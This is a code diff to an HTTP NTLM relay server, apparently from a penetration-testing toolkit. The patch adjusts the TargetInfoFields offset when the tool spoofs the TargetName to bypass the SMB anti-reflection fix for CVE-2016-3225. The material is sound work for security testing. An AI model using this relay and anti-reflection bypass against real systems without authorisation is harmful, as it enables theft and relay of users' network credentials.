@@ -293,10 +293,16 @@ class HTTPRelayServer(Thread):
                 # Spoof TargetName to bypass CVE-2016-3225 (SMB anti-reflection)
                 if self.server.config.spoof_target_name:
                     LOG.info('(HTTP): Spoofing TargetName in NTLM challenge to: %s' % self.server.config.spoof_target_name)
+                    # Save original domain_name length to calculate offset adjustment
+                    original_domain_len = len(self.challengeMessage['domain_name'])
                     # Set TargetName (domain_name field) to the spoofed SPN
                     self.challengeMessage['domain_name'] = self.server.config.spoof_target_name.encode('utf-16le')
                     self.challengeMessage['domain_len'] = len(self.challengeMessage['domain_name'])
                     self.challengeMessage['domain_max_len'] = len(self.challengeMessage['domain_name'])
+                    # Adjust TargetInfoFields offset based on the change in domain_name length
+                    offset_adjustment = len(self.challengeMessage['domain_name']) - original_domain_len
+                    self.challengeMessage['TargetInfoFields_offset'] += offset_adjustment
+                    LOG.info('(HTTP): Adjusted TargetInfoFields_offset by %d bytes (new offset: %d)' % (offset_adjustment, self.challengeMessage['TargetInfoFields_offset']))
 
                 # Remove target NetBIOS field from the NTLMSSP_CHALLENGE
                 if self.server.config.remove_target:
